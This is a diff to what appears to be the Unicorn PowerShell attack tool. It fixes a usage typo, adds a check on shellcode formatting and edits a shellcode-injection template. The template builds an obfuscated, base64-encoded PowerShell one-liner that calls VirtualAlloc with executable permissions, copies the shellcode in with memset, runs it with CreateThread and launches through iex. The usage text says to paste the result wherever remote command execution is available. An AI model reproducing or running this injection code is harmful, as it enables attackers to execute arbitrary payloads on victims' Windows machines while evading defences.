@@ -348,7 +348,7 @@ the size of 8191. This is the max command line argument size limit in Windows.
 
 Usage:
 
-python uniocrn.py shellcode_formatted_properly.txt shellcode
+python unicorn.py shellcode_formatted_properly.txt shellcode
 
 Next simply copy the powershell command to something you have the ability for remote command execution.
 
@@ -947,7 +947,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex "& $2222 -e''c $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex "& $2222 -e''c $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
@@ -1226,6 +1226,11 @@ try:
             print("[!] File not found. Check the path and try again.")
             sys.exit()
         payload = open(sys.argv[1], "r").read()
+
+        if not "," in payload:
+            print("[!] Critical: It does not appear that your payload is formatted properly. Shellcode should be in a 0x00,0x01 format.")
+            print("[!] Fix the formatting to ensure shellcode is formatted properly and try again.")
+            sys.exit()
 
         if attack_type == "cs":
             #if not "char buf[] =" in payload:
